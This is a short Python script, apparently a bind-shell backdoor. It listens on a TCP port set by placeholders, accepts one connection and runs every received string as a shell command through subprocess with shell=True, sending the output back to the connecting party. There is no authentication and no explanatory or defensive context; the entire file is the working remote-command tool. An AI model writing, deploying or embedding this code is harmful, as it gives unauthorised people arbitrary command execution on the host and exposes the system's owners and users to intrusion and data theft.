#!/usr/bin/python3

import socket
import subprocess


def received_send(c):
    received = c.recv(1024)
    process = subprocess.check_output(received.decode(
        'utf-8'), shell=True, universal_newlines=True)
    c.sendall(process.encode('utf-8'))


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = [your_host]
PORT = [your_port]

server.bind((HOST, PORT))
server.listen(1)

print('Listening...')
c, addr = server.accept()
print('New connection {}:{}'.format(addr[0], addr[1]))

while True:
    received_send(c)

c.close()
server.close()
